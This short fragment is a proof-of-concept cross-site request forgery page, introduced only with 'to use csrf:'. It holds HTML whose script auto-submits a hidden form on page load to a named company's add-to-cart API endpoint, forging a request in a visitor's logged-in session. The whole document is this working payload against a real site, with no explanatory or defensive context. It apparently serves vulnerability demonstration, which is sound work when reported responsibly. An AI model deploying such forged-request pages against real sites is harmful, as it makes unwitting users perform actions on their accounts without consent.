to use csrf: 

<html>
  <body>
    <form action="https://www-int.fiskars.com/api/sitecore/ProductAddToCartApi/AddToCart?productId=385091-1002&quantity=1" method="GET">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html> 